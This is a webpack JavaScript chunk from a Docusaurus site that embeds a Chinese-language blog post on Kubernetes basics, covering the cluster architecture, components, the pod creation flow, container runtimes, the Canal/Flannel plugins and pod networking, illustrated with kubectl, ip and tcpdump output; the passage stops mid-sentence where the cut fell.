"use strict";(self.webpackChunkwebsite=self.webpackChunkwebsite||[]).push([[4145],{48332:n=>{n.exports=JSON.parse('{"archive":{"blogPosts":[{"id":"/2025/08/07/k8s-basic","metadata":{"permalink":"/notes/blog/2025/08/07/k8s-basic","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2025-08-07-k8s-basic.md","source":"@site/blog/2025-08-07-k8s-basic.md","title":"k8s\u57fa\u7840\u77e5\u8bc6\u603b\u7ed3","description":"k8s \u57fa\u7840\u77e5\u8bc6\u603b\u7ed3","date":"2025-08-07T00:00:00.000Z","tags":[],"readingTime":28.59,"hasTruncateMarker":false,"authors":[{"name":"\u8001\u53f8\u673a","title":"Maintainer of this proj","url":"https://github.com/itxx00","imageURL":"https://github.com/itxx00.png","key":"itxx00","page":null}],"frontMatter":{"layout":"post","title":"k8s\u57fa\u7840\u77e5\u8bc6\u603b\u7ed3","authors":"itxx00","description":"k8s \u57fa\u7840\u77e5\u8bc6\u603b\u7ed3","categories":["k8s"],"tags":[]},"unlisted":false,"nextItem":{"title":"\u5982\u4f55\u901a\u8fc7loop\u6a21\u62df\u4e00\u4e2alvm\u903b\u8f91\u5377","permalink":"/notes/blog/2023/12/25/create-loop-lvm"}},"content":"k8s \u57fa\u7840\u77e5\u8bc6\u6574\u7406\u3002\\n\\n## Kubernetes \u6a21\u5757\u67b6\u6784\\n\\n```text\\n+-----------------------------------------------------+\\n|                     Kubernetes Cluster              |\\n|                                                     |\\n|  +------------------+      +--------------------+   |\\n|  |   Master Node    |      |    Worker Node(s)   |  |\\n|  |                  |      |                     |  |\\n|  |  +------------+  |      |  +---------------+  |  |\\n|  |  | API Server |<---------\x3e| Kubelet         | |  |\\n|  |  +------------+  |      |  +---------------+  |  |\\n|  |                  |      |                     |  |\\n|  |  +------------+  |      |  +---------------+  |  |\\n|  |  | Controller |  |      |  |  Container     | |  |\\n|  |  | Manager    |  |      |  |  Runtime       | |  |\\n|  |  +------------+  |      |  +---------------+  |  |\\n|  |                  |      |                     |  |\\n|  |  +------------+  |      +--------------------+   |\\n|  |  | Scheduler  |  |                               |\\n|  |  +------------+  |                               |\\n|  |                  |                               |\\n|  |  +------------+  |                               |\\n|  |  | etcd       |  |                               |\\n|  |  +------------+  |                               |\\n|  +------------------+                               |\\n|                                                     |\\n|  +------------------+                               |\\n|  | Add-ons          |                               |\\n|  |  - DNS           |                               |\\n|  |  - Dashboard     |                               |\\n|  |  - Network Plugin|                               |\\n|  +------------------+                               |\\n+-----------------------------------------------------+\\n```\\nMaster Node\uff1a\u8d1f\u8d23\u96c6\u7fa4\u7684\u7ba1\u7406\u548c\u63a7\u5236\uff0c\u5305\u542b API Server\u3001Controller Manager\u3001Scheduler \u548c etcd\uff08\u5206\u5e03\u5f0f\u952e\u503c\u5b58\u50a8\uff09\u3002\\nWorker Node\uff1a\u8d1f\u8d23\u8fd0\u884c\u5bb9\u5668\u5316\u5e94\u7528\uff0c\u5305\u542b Kubelet\uff08\u8282\u70b9\u4ee3\u7406\uff09\u3001\u5bb9\u5668\u8fd0\u884c\u65f6\uff08\u5982 containerd\u3001Docker\uff09\u7b49\u3002\\nAdd-ons\uff1a\u96c6\u7fa4\u9644\u52a0\u7ec4\u4ef6\uff0c\u5982 DNS \u670d\u52a1\u3001Dashboard\u3001\u7f51\u7edc\u63d2\u4ef6\u7b49\u3002\\n\\n## Kubernetes \u7ec4\u4ef6\\n\\n - API Server\uff1a\u8d1f\u8d23\u63d0\u4f9b Kubernetes API \u670d\u52a1\uff0c\u5305\u62ec\u521b\u5efa\u3001\u66f4\u65b0\u3001\u5220\u9664\u3001\u67e5\u8be2\u7b49\u64cd\u4f5c\u3002\\n - Controller Manager\uff1a\u8d1f\u8d23\u7ba1\u7406\u63a7\u5236\u5668\uff0c\u5305\u62ec\u8282\u70b9\u63a7\u5236\u5668\u3001\u526f\u672c\u63a7\u5236\u5668\u3001\u670d\u52a1\u63a7\u5236\u5668\u7b49\u3002\\n - Scheduler\uff1a\u8d1f\u8d23\u8c03\u5ea6 Pod \u5230\u5408\u9002\u7684\u8282\u70b9\u4e0a\u3002\\n - Kubelet\uff1a\u8d1f\u8d23\u7ba1\u7406\u8282\u70b9\u4e0a\u7684\u5bb9\u5668\u5316\u5e94\u7528\uff0c\u5305\u62ec\u542f\u52a8\u3001\u505c\u6b62\u3001\u91cd\u542f\u7b49\u64cd\u4f5c\u3002\\n - Container Runtime\uff1a\u8d1f\u8d23\u7ba1\u7406\u5bb9\u5668\uff0c\u5305\u62ec\u542f\u52a8\u3001\u505c\u6b62\u3001\u91cd\u542f\u7b49\u64cd\u4f5c\u3002\\n - etcd\uff1a\u5206\u5e03\u5f0f\u952e\u503c\u5b58\u50a8\uff0c\u7528\u4e8e\u5b58\u50a8 Kubernetes \u96c6\u7fa4\u7684\u72b6\u6001\u4fe1\u606f\u3002\\n - Add-ons\uff1a\u96c6\u7fa4\u9644\u52a0\u7ec4\u4ef6\uff0c\u5982 DNS \u670d\u52a1\u3001Dashboard\u3001\u7f51\u7edc\u63d2\u4ef6\u7b49\u3002\\n - Kube-proxy\uff1a\u8d1f\u8d23\u5b9e\u73b0 Kubernetes \u670d\u52a1\u53d1\u73b0\u548c\u8d1f\u8f7d\u5747\u8861\uff0c\u5c06\u670d\u52a1\u8bf7\u6c42\u8def\u7531\u5230\u6b63\u786e\u7684 Pod\u3002\\n - CNI\uff08Container Network Interface\uff09\uff1a\u8d1f\u8d23\u4e3a\u5bb9\u5668\u63d0\u4f9b\u7f51\u7edc\u529f\u80fd\uff0c\u5982\u521b\u5efa\u7f51\u7edc\u547d\u540d\u7a7a\u95f4\u3001\u914d\u7f6e IP \u5730\u5740\u3001\u8def\u7531\u8868\u7b49\u3002\\n - Kube-dns\uff1a\u8d1f\u8d23\u4e3a Kubernetes \u96c6\u7fa4\u4e2d\u7684\u670d\u52a1\u63d0\u4f9b DNS \u89e3\u6790\u670d\u52a1\u3002\\n - Ingress Controller\uff1a\u8d1f\u8d23\u5904\u7406\u5916\u90e8\u6d41\u91cf\u8fdb\u5165\u96c6\u7fa4\u7684\u6d41\u91cf\u8def\u7531\u548c\u8d1f\u8f7d\u5747\u8861\u3002\\n - Dashboard\uff1a\u63d0\u4f9b Web \u754c\u9762\uff0c\u7528\u4e8e\u53ef\u89c6\u5316\u7ba1\u7406\u548c\u76d1\u63a7 Kubernetes \u96c6\u7fa4\u3002\\n - Logging and Monitoring\uff1a\u8d1f\u8d23\u6536\u96c6\u548c\u5206\u6790\u5bb9\u5668\u7684\u65e5\u5fd7\uff0c\u63d0\u4f9b\u76d1\u63a7\u548c\u62a5\u8b66\u529f\u80fd\u3002\\n - Helm\uff1a\u7528\u4e8e\u7ba1\u7406 Kubernetes \u5e94\u7528\u7684\u5305\u7ba1\u7406\u5668\uff0c\u7c7b\u4f3c\u4e8e Linux \u7cfb\u7edf\u4e2d\u7684 apt \u6216 yum\u3002\\n - Prometheus\uff1a\u7528\u4e8e\u76d1\u63a7\u548c\u62a5\u8b66\uff0c\u63d0\u4f9b\u6307\u6807\u6536\u96c6\u548c\u67e5\u8be2\u529f\u80fd\u3002\\n - Grafana\uff1a\u7528\u4e8e\u53ef\u89c6\u5316\u76d1\u63a7\u6570\u636e\uff0c\u652f\u6301\u591a\u79cd\u6570\u636e\u6e90\uff0c\u5982 Prometheus\u3001InfluxDB \u7b49\u3002\\n\\n## k8s \u5e38\u89c1\u8d44\u6e90\u7c7b\u578b\\n- Pod\\nPod\u4e5f\u53eb\u5bb9\u5668\u7ec4\uff0c\u662fKubernetes\u4e2d\u6700\u5c0f\u7684\u53ef\u90e8\u7f72\u5355\u5143\uff0c\u5b83\u662f\u4e00\u4e2a\u6216\u591a\u4e2a\u76f8\u5173\u5bb9\u5668\u7684\u7ec4\u5408\u3002Pod\u4e2d\u7684\u5bb9\u5668\u5171\u4eab\u7f51\u7edc\u548c\u5b58\u50a8\u8d44\u6e90\uff0c\u5e76\u5728\u540c\u4e00\u4e3b\u673a\u4e0a\u8fd0\u884c\u3002Pod\u7531Kubernetes\u8c03\u5ea6\u5668\u5206\u914d\u7ed9\u8282\u70b9\uff0c\u5e76\u4f7f\u7528Linux\u547d\u540d\u7a7a\u95f4\u548ccgroups\u6765\u9694\u79bb\u5bb9\u5668\u3002\\n\\n- Deployment\\nDeployment\u7528\u4e8e\u7ba1\u7406\u65e0\u72b6\u6001Pod\u7684\u521b\u5efa\u548c\u66f4\u65b0\u3002\u5b83\u901a\u8fc7\u63a7\u5236\u5668\u6a21\u5f0f\uff08ReplicaSet\uff09\u6765\u786e\u4fdd\u6307\u5b9a\u6570\u91cf\u7684Pod\u526f\u672c\u5728\u96c6\u7fa4\u4e2d\u8fd0\u884c\u3002\u5f53\u9700\u8981\u8fdb\u884c\u6269\u5c55\u3001\u56de\u6eda\u6216\u66f4\u65b0\u65f6\uff0cDeployment\u4f1a\u521b\u5efa\u65b0\u7684Pod\uff0c\u5e76\u9010\u6b65\u66ff\u6362\u65e7\u7684Pod\u3002\\n\\n- Service\\nService\u63d0\u4f9b\u4e86\u4e00\u79cd\u7a33\u5b9a\u7684\u7f51\u7edc\u8bbf\u95ee\u65b9\u5f0f\uff0c\u7528\u4e8e\u66b4\u9732Pod\u6216\u4e00\u7ec4Pod\u7684\u7f51\u7edc\u670d\u52a1\u3002Service\u901a\u8fc7\u6807\u7b7e\u9009\u62e9\u5668\uff08Label Selector\uff09\u5c06\u8bf7\u6c42\u8def\u7531\u5230\u540e\u7aefPod\u3002\u5b83\u4f7f\u7528Kubernetes\u7684\u670d\u52a1\u53d1\u73b0\u673a\u5236\uff0c\u901a\u8fc7\u96c6\u7fa4\u5185\u90e8\u7684DNS\u6216\u8d1f\u8f7d\u5747\u8861\u5668\u5c06\u8bf7\u6c42\u8f6c\u53d1\u5230\u6b63\u786e\u7684Pod\u3002\\n\\n- Ingress\\nIngress\u662f\u4e00\u79cd\u89c4\u5219\u96c6\u5408\uff0c\u7528\u4e8e\u5c06\u5916\u90e8\u8bf7\u6c42\u8def\u7531\u5230\u96c6\u7fa4\u5185\u90e8\u7684Service\u3002\u5b83\u5145\u5f53\u4e86\u96c6\u7fa4\u5916\u90e8\u548c\u96c6\u7fa4\u5185\u90e8\u4e4b\u95f4\u7684\u5165\u53e3\u70b9\u3002Ingress\u63a7\u5236\u5668\u6839\u636eIngress\u89c4\u5219\u5c06\u8bf7\u6c42\u8f6c\u53d1\u5230\u76f8\u5e94\u7684Service\uff0c\u5e76\u5904\u7406\u8d1f\u8f7d\u5747\u8861\u3001SSL\u7ec8\u6b62\u548c\u8def\u5f84\u5339\u914d\u7b49\u529f\u80fd\u3002\\n\\n- ConfigMap\\nConfigMap\u7528\u4e8e\u5b58\u50a8\u5e94\u7528\u7a0b\u5e8f\u7684\u914d\u7f6e\u6570\u636e\uff0c\u5982\u73af\u5883\u53d8\u91cf\u3001\u914d\u7f6e\u6587\u4ef6\u7b49\u3002\u5b83\u5c06\u914d\u7f6e\u6570\u636e\u5b58\u50a8\u4e3a\u952e\u503c\u5bf9\uff0c\u5e76\u5c06\u5176\u6ce8\u5165\u5230Pod\u7684\u5bb9\u5668\u4e2d\u3002\u5bb9\u5668\u53ef\u4ee5\u901a\u8fc7\u73af\u5883\u53d8\u91cf\u6216\u6302\u8f7d\u6587\u4ef6\u7684\u65b9\u5f0f\u8bbf\u95eeConfigMap\u4e2d\u7684\u914d\u7f6e\u6570\u636e\u3002\\n\\n- Secret\\nSecret\u7528\u4e8e\u5b58\u50a8\u654f\u611f\u6570\u636e\uff0c\u5982\u5bc6\u7801\u3001\u4ee4\u724c\u7b49\u3002\u8bfb\u53d6Secret\u65f6\u9ed8\u8ba4\u4ee5Base64\u7f16\u7801\u7684\u5f62\u5f0f\u4ece etcd \u4e2d\u53d6\u51fa\uff0c\u5e76\u53ef\u4ee5\u88abPod\u4e2d\u7684\u5bb9\u5668\u4f7f\u7528\u3002Secret\u53ef\u4ee5\u7528\u4e8e\u5b89\u5168\u5730\u4f20\u9012\u654f\u611f\u4fe1\u606f\uff0c\u5982\u6570\u636e\u5e93\u5bc6\u7801\u6216API\u5bc6\u94a5\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f k8s \u5e76\u4e0d\u9ed8\u8ba4\u63d0\u4f9b\u5bf9 secrets \u7684\u52a0\u5bc6\uff0c\u9700\u8981\u81ea\u5df1\u5b9e\u73b0\u5bc6\u94a5\u7ba1\u7406\u670d\u52a1\uff08Key Management Service\uff0cKMS\uff09\u3002\\n\\n\\n## pod \u521b\u5efa\u8fc7\u7a0b\\n\u521b\u5efa pod \u7684\u6d41\u7a0b\u5927\u81f4\u5982\u4e0b\uff1a\\n1. \u5f53\u6267\u884c kubectl create deploy \u65f6\uff0ck8s \u6267\u884c\u7684\u6d41\u7a0b\u5982\u4e0b\uff1a\\n2. kubectl \u6267\u884c\u5ba2\u6237\u7aef\u6821\u9a8c\uff0c\u8d44\u6e90\u7c7b\u578b\u3001\u955c\u50cf\u540d\u79f0\u7b49\\n3. Kubectl \u8bfb\u53d6.kube/config\u83b7\u53d6\u8ba4\u8bc1\u4fe1\u606f\uff0ckube-apiserver \u5730\u5740\\n4. kubectl \u751f\u6210\u8bf7\u6c42\u5185\u5bb9\u5e76\u5f80 apiserver \u53d1\u9001\u521b\u5efa\u8bf7\u6c42\\n5. kube-apiserver \u901a\u8fc7\u8ba4\u8bc1\u548c\u9274\u6743\u540e\u5c06\u4fe1\u606f\u5b58\u50a8\u81f3 etcd\\n6. kube-controller-manager\u76d1\u542c\u5230 deploy create events\uff0c\u68c0\u67e5\u76f8\u5173\u8d44\u6e90\u662f\u5426\u5df2\u7ecf\u5b58\u5728\\n7. Deployment controller \u521b\u5efa ReplicaSets\uff0creplicaset controller \u521b\u5efa pods\uff0c\u5b58\u5165 etcd\uff0cpod \u8fdb\u5165 pending \u72b6\u6001\\n8. kube-scheduler\u76d1\u542c\u5230 pod \u672a\u5206\u914d\u8282\u70b9\uff0c\u5f00\u59cb\u9009\u62e9\u5408\u9002\u7684\u8282\u70b9\uff0c\u53d1\u9001 POST \u8bf7\u6c42\u7ed9 apiserver\\n9. kube-apiserver \u5c06 pod \u72b6\u6001\u6807\u8bb0\u4e3a scheduled\\n10. kubelet \u8f6e\u8be2 kube-apiserver \u83b7\u53d6 pod \u4fe1\u606f\uff0c\u5f00\u59cb\u521b\u5efa cgroup\uff0c\u521b\u5efa\u6570\u636e\u76ee\u5f55\uff0c\u8c03\u7528 CRI \uff08container runtime interface\uff09\u521b\u5efa container\\n11. \u521b\u5efa pause \u5bb9\u5668\uff0ckubelet \u901a\u8fc7 CNI\uff08container network interface\uff09\u521b\u5efa\u7f51\u7edc\\n12. kubelet \u4ece\u955c\u50cf\u4ed3\u5e93\u62c9\u53d6pod \u7684\u955c\u50cf\uff0c\u901a\u8fc7 CRI \u63d2\u4ef6\u521b\u5efa container\\n \u4ee5\u4e0a\u4ec5\u662f\u5bf9\u5173\u952e\u6b65\u9aa4\u7684\u7b80\u8981\u63cf\u8ff0\uff0c\u5b9e\u9645\u60c5\u51b5\u8981\u590d\u6742\u5f97\u591a\u3002\\n\\ndocker\u3001containerd\u3001runc \u662f\u4ec0\u4e48\u5173\u7cfb\uff1f\\ncontainerd\u3001runc \u7531 docker \u62c6\u5206\u51fa\u6765\uff0crunc \u662f\u4e00\u4e2a\u6807\u51c6\u7684OCI runtime\u5b9e\u73b0\uff0ccontainerd \u652f\u6301\u591a\u79cdOCI runtime \u5b9e\u73b0\uff0c\u5bf9\u5e94 runc \u7684\u652f\u6301\u63d0\u4f9b\u4e86 containerd-shim-runc-v2,\u4e00\u4e2a\u5bb9\u5668\u7684\u521b\u5efa\u5177\u4f53\u8fc7\u7a0b\u5982\u4e0b\uff1a\\n\\n```mermaid\\nflowchart LR\\n    A[docker cli] --\x3e B[dockerd]\\n    B -- gRPC --\x3e C[containerd]\\n    D[kubelet] -- gRPC --\x3e C\\n    C -- exec --\x3e E[containerd-shim]\\n    E -- exec --\x3e F[containerd-shim-runc-v2]\\n    F -- exec --\x3e G[runc]\\n    G -- exec --\x3e H[\u5bb9\u5668\u8fdb\u7a0b]\\n    style E stroke-dasharray: 4 2\\n    style F stroke-dasharray: 4 2\\n    style G stroke-dasharray: 4 2\\n```\\n\\n\\n k8s v1.19\u7248\u672c\uff0ckubelet \u4f7f\u7528 docker-shim\u4e0e dockerd \u901a\u4fe1\uff0ck8s\u81ea v1.20\u7248\u672c\u5f00\u59cb\u5efa\u8bae\u4f7f\u7528 containerd-shim\uff0c1.24 \u7248\u672c\u5f7b\u5e95\u5e9f\u5f03 docker-shim\u3002\\n\\n## Canal\\nCanal \u662f\u4e00\u4e2a CNI \u7f51\u7edc\u63d2\u4ef6\uff0c\u5b83\u5f88\u597d\u5730\u7ed3\u5408\u4e86 Flannel \u548c Calico \u7684\u4f18\u70b9\u3002\u5b83\u8ba9\u4f60\u8f7b\u677e\u5730\u5c06 Calico \u548c Flannel \u7f51\u7edc\u90e8\u7f72\u4e3a\u7edf\u4e00\u7684\u7f51\u7edc\u89e3\u51b3\u65b9\u6848\uff0c\u5c06 Calico \u7684\u7f51\u7edc\u7b56\u7565\u6267\u884c\u4e0e Calico\uff08\u672a\u5c01\u88c5\uff09\u548c Flannel\uff08\u5c01\u88c5\uff09\u4e30\u5bcc\u7684\u7f51\u7edc\u8fde\u63a5\u9009\u9879\u7ed3\u5408\u8d77\u6765\u3002\\nCanal \u662f Rancher \u9ed8\u8ba4\u7684 CNI \u7f51\u7edc\u63d2\u4ef6\uff0c\u5e76\u91c7\u7528\u4e86 Flannel \u548c VXLAN \u5c01\u88c5\u3002\\nCNI\uff08\u5bb9\u5668\u7f51\u7edc\u63a5\u53e3\uff09\u662f\u4e00\u4e2a\u4e91\u539f\u751f\u8ba1\u7b97\u57fa\u91d1\u4f1a\u9879\u76ee\uff0c\u5b83\u5305\u542b\u4e86\u4e00\u4e9b\u89c4\u8303\u548c\u5e93\uff0c\u7528\u4e8e\u7f16\u5199\u5728 Linux \u5bb9\u5668\u4e2d\u914d\u7f6e\u7f51\u7edc\u63a5\u53e3\u7684\u4e00\u7cfb\u5217\u63d2\u4ef6\u3002CNI \u53ea\u5173\u6ce8\u5bb9\u5668\u7684\u7f51\u7edc\u8fde\u63a5\uff0c\u5e76\u5728\u5bb9\u5668\u88ab\u5220\u9664\u65f6\u79fb\u9664\u6240\u5206\u914d\u7684\u8d44\u6e90\u3002\\nKubernetes \u4f7f\u7528 CNI \u4f5c\u4e3a\u7f51\u7edc\u63d0\u4f9b\u5546\u548c Kubernetes Pod \u7f51\u7edc\u4e4b\u95f4\u7684\u63a5\u53e3\u3002\\nCanal \u67b6\u6784\\nFlannel \u662f\u4e3a Kubernetes \u914d\u7f6e L3 \u7f51\u7edc\u7ed3\u6784\u7684\u7b80\u5355\u65b9\u6cd5\u3002Flannel \u5728\u6bcf\u53f0\u4e3b\u673a\u4e0a\u8fd0\u884c\u4e00\u4e2a\u540d\u4e3a flanneld \u7684\u4e8c\u8fdb\u5236 Agent\uff0c\u8be5 Agent \u8d1f\u8d23\u4ece\u66f4\u5927\u7684\u9884\u914d\u7f6e\u5730\u5740\u7a7a\u95f4\u4e2d\u4e3a\u6bcf\u53f0\u4e3b\u673a\u5206\u914d\u5b50\u7f51\u79df\u7ea6\u3002Flannel \u901a\u8fc7 Kubernetes API \u6216\u76f4\u63a5\u4f7f\u7528 etcd \u6765\u5b58\u50a8\u7f51\u7edc\u914d\u7f6e\u3001\u5206\u914d\u7684\u5b50\u7f51\u3001\u4ee5\u53ca\u5176\u4ed6\u8f85\u52a9\u6570\u636e\uff08\u4f8b\u5982\u4e3b\u673a\u7684\u516c\u5171 IP\uff09\u3002\u6570\u636e\u5305\u4f7f\u7528\u67d0\u79cd\u540e\u7aef\u673a\u5236\u6765\u8f6c\u53d1\uff0c\u9ed8\u8ba4\u5c01\u88c5\u4e3a VXLAN\u3002\\n\\n```text\\n+-------------------------------------------------------------+\\n|                         Master Node                         |\\n|                                                             |\\n|  +-----------+     +-----------+       +----------------+   |\\n|  | Kubelet   | --\x3e | Scheduler |       | Controller     |   |\\n|  +-----------+     +-----------+       | Manager        |   |\\n|           \\\\            |               +----------------+   |\\n|            \\\\           |                      |             |\\n|             \\\\          |                      |             |\\n|              \\\\         |                      v             |\\n|               \\\\        +-----------------\x3e API Server <-----+ <-- kubectl\\n|                \\\\                       /     ^       ^      |\\n|                 \\\\                     /      |       |      |\\n|                  \\\\                   /       |       |      |\\n|                   \\\\                 /        |       |      |\\n|                    \\\\               /         |       |      |\\n|                     v             v          |       |      |\\n|                    etcd <---------+          |       |      |\\n|                      ^                       |       |      |\\n|                      |                       |       |      |\\n|                   Proxy <--------------------+       |      |\\n|                      |                               |      |\\n+-------------------------------------------------------------+\\n+-------------------------------------------------------------+\\n|                        Worker Nodes                         |\\n|                                                             |\\n|  +-----------+     +-----------+       +----------------+   |\\n|  | Kubelet   | --\x3e | Proxy     |       | Flannel        |   |\\n|  +-----------+     +-----------+       +----------------+   |\\n|       |                |                     |              |\\n|       v                |                     |              |\\n|    Docker             <----------------------+              |\\n|       |                          10.0.0.0/8 (Flannel \u7f51\u7edc)  |\\n|       v                                                     |\\n|    PODs --------------------------------------------\x3e PODs  |\\n+-------------------------------------------------------------+\\n```\\n\u8bf4\u660e\uff1a\\n- Master Node \u8d1f\u8d23\u96c6\u7fa4\u7ba1\u7406\uff0c\u5305\u62ec Kubelet\u3001Scheduler\u3001Controller Manager\u3001API Server\u3001etcd \u548c Proxy\u3002\\n- Worker Nodes \u8fd0\u884c\u5e94\u7528\u5bb9\u5668\uff0c\u5305\u542b Kubelet\u3001Proxy\u3001Docker \u548c POD\u3002\\n- Flannel \u8d1f\u8d23\u8de8\u8282\u70b9\u7f51\u7edc\u901a\u4fe1\uff0c\u4f7f\u7528 10.0.0.0/8 \u7f51\u6bb5\u3002\\n- kubectl \u901a\u8fc7 API Server \u4e0e\u96c6\u7fa4\u4ea4\u4e92\u3002\\n- \u6d41\u91cf\uff08traffic\uff09\u5728 Proxy \u4e4b\u95f4\u4f20\u9012\u3002\\n\\n## pod\u7f51\u7edc\u901a\u4fe1\\n pod \u662f\u5982\u4f55\u4e0e\u5916\u90e8\u901a\u4fe1\u7684\uff1f\\n\\nCNI \u63d2\u4ef6\u4e3a\u6bcf\u4e2a\u8282\u70b9\u5206\u914d\u4e00\u4e2a/24\u7f51\u6bb5\uff0c\u4f8b\u598210.42.0.0/24 10.42.1.0/24\uff0c\u6bcf\u4e2a pod \u5206\u914d\u4e00\u4e2a\u8be5\u8282\u70b9\u6301\u6709\u7f51\u6bb5\u7684 ip \u5730\u5740\uff1b\u6bcf\u4e2a pod \u5185\u6709\u4e00\u4e2a eth0 \u865a\u62df\u7f51\u5361\uff0c\u540c\u65f6\u5bbf\u4e3b\u673a\u4e2d\u6709\u4e0e\u5176\u914d\u5bf9\u7684\u53e6\u5916\u4e00\u4e2a\u865a\u62df\u7f51\u5361\uff0c\u4e8c\u8005\u540c\u5c5e\u4e00\u4e2a network namespace\uff0c\u8fd9\u79cd\u6210\u5bf9\u51fa\u73b0\u7684\u7f51\u5361\u53ebveth pair\uff0c\u4e24\u8005\u53ef\u4ee5\u76f8\u4e92\u901a\u4fe1\uff0c\u5c31\u597d\u6bd4\u6709\u4e00\u6839\u7f51\u7ebf\u4e00\u5934\u8fde\u63a5\u4f60\u7684\u7535\u8111\u7f51\u5361\uff0c\u53e6\u4e00\u5934\u8fde\u63a5\u4ea4\u6362\u673a\u3002\u4ee5\u4e0b\u9762 pod \u4e3e\u4f8b\u8bf4\u660e\uff1a\\n```bash\\n[k8s@k8s-192-168-4-88 ~]$ kubectl -n k8s get pod -owide | grep 192.168.4.88\\nk8s-xxx-648c86cd45-qbhj9      1/1     Running   0          43d       10.42.4.15     192.168.4.88\\n[k8s@k8s-192-168-4-88 ~]$\\n```\\n\\n\u8282\u70b9\u4e0a\u67e5\u770b pod \u5bf9\u5e94\u7684 container \u5982\u4e0b\uff0c\u4e0e\u8fd9\u4e2a pod \u6709\u5173\u7684 container \u6709\u4e24\u4e2a\uff0c\u4e00\u4e2a\u662f\u4e1a\u52a1\u8fdb\u7a0b\u672c\u8eab\uff0c\u4e00\u4e2a\u662f/pause\u8fdb\u7a0b,\u67e5\u770b pod \u5185\u7684\u7f51\u5361\u5982\u4e0b\uff1a\\n```bash\\n[k8s@k8s-192-168-4-88 ~]$ kubectl -n k8s exec k8s-xxx-648c86cd45-qbhj9 -- ip a\\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000\\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\\n    inet 127.0.0.1/8 scope host lo\\n       valid_lft forever preferred_lft forever\\n3: eth0@if52: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1450 qdisc noqueue state UP\\n    link/ether be:67:6a:d4:65:98 brd ff:ff:ff:ff:ff:ff\\n    inet 10.42.4.15/32 brd 10.42.4.15 scope global eth0\\n       valid_lft forever preferred_lft forever\\n```\\n\\n\u5bbf\u4e3b\u673a\u4e0a\u7684peer veth \u5982\u4e0b\uff1a\\n```bash\\n[k8s@k8s-192-168-4-88 ~]$ ip l | grep ^52:\\n52: cali18e95c70453@if3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1450 qdisc noqueue state UP mode DEFAULT group default\\n```\\n\\n\u53ef\u4ee5\u770b\u5230 pod \u4e2d\u7684\u7f51\u5361\u540d\uff0c\u4ed6\u6709\u56fa\u5b9a\u7684\u547d\u540d\u89c4\u5219\uff0c\u5e26\u4e86\u5bf9\u7aef\u7f51\u5361\u7684 index \u7f16\u53f7 52\uff0c\u5728\u5bbf\u4e3b\u673a\u4e0a\u67e5\u770b index \u7f16\u53f7\u4e3a 52 \u7684\u7f51\u5361\u540d\u4e3acali18e95c70453\uff0c pod \u7684\u7f51\u7edc\u5305\u6536\u53d1\u90fd\u4f1a\u7ecf\u8fc7\u5bbf\u4e3b\u673a\u4e0a\u7684cali18e95c70453\u7f51\u5361\uff0c\u53ef\u4ee5\u6293\u5305\u9a8c\u8bc1\u4e00\u4e0b\uff1a\\n\\n```bash\\n[k8s@k8s-192-168-4-88 ~]$ kubectl -n k8s exec -it k8s-xxx-648c86cd45-qbhj9 -- curl xxx.com\\n<html>\\n<head><title>301 Moved Permanently</title></head>\\n<body>\\n<center><h1>301 Moved Permanently</h1></center>\\n<hr><center>TLB</center>\\n</body>\\n</html>\\n[k8s@k8s-192-168-4-88 ~]$\\n[k8s@k8s-192-168-4-88 ~]$ sudo tcpdump -nnpA -i cali18e95c70453 tcp dst port 80\\ntcpdump: verbose output suppressed, use -v or -vv for full protocol decode\\nlistening on cali18e95c70453, link-type EN10MB (Ethernet), capture size 262144 bytes\\n15:59:43.723438 IP 10.42.4.15.49848 > 122.14.236.25.80: Flags [S], seq 2904204625, win 28200, options [mss 1410,sackOK,TS val 3\\nE...<.M@.@..\\n*..z.......P...Q.......n(t.........\\n..U........\\n15:59:43.750376 IP 10.42.4.15.49848 > 122.14.236.25.80: Flags [.], ack 3650196656, win 221, options [nop,nop,TS val 3808777527\\nE..4.N@.@...\\n*..z.......P...R.......t.......\\n..U7{...\\n15:59:43.750434 IP 10.42.4.15.49848 > 122.14.236.25.80: Flags [P.], seq 0:77, ack 1, win 221, options [nop,nop,TS val 380877752\\nE....O@.@...\\n*..z.......P...R.......t.......\\n..U7{...GET / HTTP/1.1\\nHost: xxx.com\\nUser-Agent: curl/8.5.0\\nAccept: */*\\n```\\n\\n pod \u4e0e pod \u4e4b\u95f4\u662f\u5982\u4f55\u901a\u4fe1\u7684\u5462\uff1f\u9996\u5148\u5bbf\u4e3b\u673a\u7684\u8def\u7531\u8868\u5982\u4e0b\uff1a\\n```text\\ndefault via 192.168.4.1 dev eth0\\n10.42.0.0/24 via 10.42.0.0 dev flannel.1 onlink\\n10.42.1.0/24 via 10.42.1.0 dev flannel.1 onlink\\n10.42.2.0/24 via 10.42.2.0 dev flannel.1 onlink\\n10.42.3.0/24 via 10.42.3.0 dev flannel.1 onlink\\n10.42.5.0/24 via 10.42.5.0 dev flannel.1 onlink\\n10.42.4.15 dev cali18e95c70453 scope link \\n169.254.0.0/16 dev eth0 scope link metric 1002\\n172.17.0.0/16 dev docker0 proto kernel scope link src 172.17.0.1\\n192.168.4.0/24 dev eth0 proto kernel scope link src 192.168.4.88\\n```\\n\\n\u53ef\u4ee5\u770b\u5230\u548c\u5176\u4ed6\u5bbf\u4e3b\u673a\u7684 pod  ip \u6bb5\u662f\u901a\u8fc7flannel.1\u7f51\u5361\u53d1\u9001\uff0c\u518d\u770b\u4e00\u4e0b\u90bb\u5c45\u8868\uff1a\\n```text\\n10.42.2.0 dev flannel.1 lladdr 62:6d:e7:6f:f3:e9 PERMANENT\\n10.42.1.0 dev flannel.1 lladdr 9a:b6:27:23:b2:21 PERMANENT\\n10.42.0.0 dev flannel.1 lladdr a6:eb:6d:4e:48:3a PERMANENT\\n10.42.3.0 dev flannel.1 lladdr 16:8e:4f:5c:1e:63 PERMANENT\\n10.42.5.0 dev flannel.1 lladdr 0a:14:55:b6:2e:97 PERMANENT\\n```\\n\\n\u7531\u6b64\u53ef\u77e5\u5f53\u53d1\u9001\u5f80\u5176\u4ed6\u8282\u70b9pod\u7684\u6570\u636e\u5305\u5230\u8fbeflannel.1\u7f51\u5361\u65f6\uff0c\u6bcf\u4e2a\u7f51\u6bb5\u90fd\u5bf9\u5e94\u6709\u4e00\u6761\u76ee\u6807 mac \u5730\u5740\uff0c\u800c\u8fd9\u4e9b mac 